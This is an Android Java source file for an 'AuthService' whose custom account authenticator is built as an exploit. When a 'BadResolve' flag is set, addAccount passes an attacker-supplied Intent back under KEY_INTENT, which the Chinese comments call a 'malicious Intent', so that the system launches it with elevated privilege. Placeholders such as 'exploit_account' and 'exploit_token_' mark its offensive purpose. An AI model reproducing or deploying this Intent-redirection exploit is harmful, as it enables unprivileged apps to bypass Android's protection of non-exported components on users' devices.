package com.cfks.startanywhere;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

public class AuthService extends Service {

    private static final String TAG = "AuthService";
    public static Bundle addAccountResponse;
    public static volatile boolean isBadResolve = false;

    public static void setAddAccountResponse(Bundle response) {
        addAccountResponse = response;
    }
    
    public static void enableBadResolveMode(boolean enable) {
        isBadResolve = enable;
        Log.d(TAG, "BadResolve mode: " + enable);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return new Authenticator(this).getIBinder();
    }

    private static class Authenticator extends AbstractAccountAuthenticator {
        
        Authenticator(Context context) {
            super(context);
        }

        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, 
                                 String authTokenType, String[] requiredFeatures, Bundle options) 
                                 throws NetworkErrorException {
            
            Log.d(TAG, "addAccount called, isBadResolve=" + isBadResolve);
            
            if (isBadResolve) {
                // 关键修复：返回包含恶意Intent的Bundle
                Bundle result = new Bundle();
                result.putString(AccountManager.KEY_ACCOUNT_NAME, "exploit_account");
                result.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
                result.putParcelable(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
                
                // 从options中获取并传递恶意Intent
                Intent exploitIntent = null;
                if (options != null) {
                    exploitIntent = options.getParcelable(AccountManager.KEY_INTENT);
                    if (exploitIntent != null) {
                        result.putParcelable(AccountManager.KEY_INTENT, exploitIntent);
                        Log.d(TAG, "Added exploit intent to result: " + exploitIntent);
                    }
                }
                
                // 重置标志，避免重复触发
                isBadResolve = false;
                return result;
            }
            
            // 正常模式
            if (addAccountResponse != null) {
                return addAccountResponse;
            }
            
            // 默认响应
            Bundle defaultResult = new Bundle();
            defaultResult.putString(AccountManager.KEY_ACCOUNT_NAME, "default_account");
            defaultResult.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
            return defaultResult;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, 
                                         Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, 
                                   String authTokenType, Bundle options) throws NetworkErrorException {
            Bundle result = new Bundle();
            result.putString(AccountManager.KEY_AUTHTOKEN, "exploit_token_" + System.currentTimeMillis());
            result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
            result.putString(AccountManager.KEY_ACCOUNT_TYPE, account.type);
            return result;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, 
                                        String authTokenType, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, 
                                  String[] features) throws NetworkErrorException {
            Bundle result = new Bundle();
            result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
            return result;
        }
    }
}